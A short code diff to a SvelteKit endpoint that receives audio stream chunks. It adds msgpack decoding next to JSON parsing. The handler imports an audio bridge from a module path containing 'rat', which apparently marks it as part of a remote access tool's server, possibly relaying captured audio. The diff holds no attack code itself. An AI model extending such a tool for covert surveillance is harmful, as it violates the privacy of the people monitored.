@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
 import type { AudioStreamChunk } from '$lib/types/audio';
+import { decode } from '@msgpack/msgpack';
 
 export const POST: RequestHandler = async ({ params, request }) => {
 	const id = params.id;
@@ -11,7 +12,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 
 	let payload: AudioStreamChunk;
 	try {
-		payload = (await request.json()) as AudioStreamChunk;
+		const contentType = request.headers.get('content-type') || '';
+		if (contentType.includes('application/msgpack')) {
+			const buffer = await request.arrayBuffer();
+			payload = decode(buffer) as AudioStreamChunk;
+		} else {
+			payload = (await request.json()) as AudioStreamChunk;
+		}
 	} catch {
 		throw error(400, 'Invalid audio chunk payload');
 	}
